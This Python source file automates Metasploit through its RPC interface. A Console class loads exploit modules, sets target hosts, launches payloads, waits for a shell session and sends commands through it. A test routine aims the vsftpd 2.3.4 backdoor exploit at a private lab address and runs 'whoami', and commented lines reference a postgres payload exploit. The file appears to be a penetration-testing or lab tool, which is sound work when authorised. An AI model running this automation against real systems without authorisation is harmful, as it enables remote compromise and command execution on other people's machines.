import subprocess
import logging
import asyncio
from pymetasploit3.msfrpc import MsfRpcClient
from database import ExploitDB


logging.basicConfig(
    level=logging.DEBUG,
    format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
class Console:
    def __init__(self, db: ExploitDB) -> None:
        self.db = db
        self.client = MsfRpcClient('yourpassword', ssl=True)
        self.exploit = None
        self.shells = {}

    def set_payload(self, payload_path):
        self.exploit = self.client.modules.use('exploit', payload_path)
        
    def set_arguments(self, arguments):
        for argument in arguments.keys():
            self.exploit[argument] = arguments[argument]

    def get_session_id(self, ip):
        for id in self.client.sessions.list.keys():
            if self.client.sessions.list[id]["session_host"] == ip:
                return id
        return None

    async def run_payload(self, shell_path, ip):
        old_len = len(self.client.sessions.list)
        exploit_result = self.exploit.execute(payload=shell_path)
        exploit_result["ip"] = ip
        logging.debug("job_id -> " + str(exploit_result["job_id"]))
        logging.debug(exploit_result)
        while True:
            logging.debug(self.client.sessions.list)
            await asyncio.sleep(1)
            new_len = len(self.client.sessions.list)
            logging.debug(str(old_len)+"; "+ str(new_len))
            if new_len - 1 == old_len:
                logging.debug("session received")
                logging.debug(self.client.sessions.list)
                break

        session_id = self.get_session_id(ip)

        if exploit_result["job_id"] == None or session_id == None:
            logging.error("payload failed")
            return
        logging.debug(exploit_result)
        return session_id

    async def interact(self, session_id, command, ip):
        logging.debug("trying to interact: " + session_id)
        client = MsfRpcClient('yourpassword',ssl=True)
        session_id = session_id
        for id in client.sessions.list.keys():
            if client.sessions.list[id]["session_host"] == ip:
                session_id = id  
        shell = client.sessions.session(session_id)
        shell.write(command)
        print(shell.read())

        
    def get_sessions(self):
        return self.client.sessions.list
    
    async def exploit(self, ip, path):
        logging.debug("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload(path)
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":ip
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',ip)
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami",ip)
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())


    async def test(self):
        logging.debug("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload('unix/ftp/vsftpd_234_backdoor')
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":"192.168.17.130"
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',"192.168.17.130")
        if session_id is None: return
        logging.debug("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami","192.168.17.130")
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())



async def testing():

    db = ExploitDB()
    console = Console(db=db)
    await console.test()
    # await console.start_msfconsole()
    # await console.set_payload("exploit/linux/postgres/postgres_payload")
    # await console.set_argument("tt","a")
    # await console.set_argument("rhosts", "192.168.17.130")
    # await console.set_argument("lhost","eth0")
    # await console.run_payload()

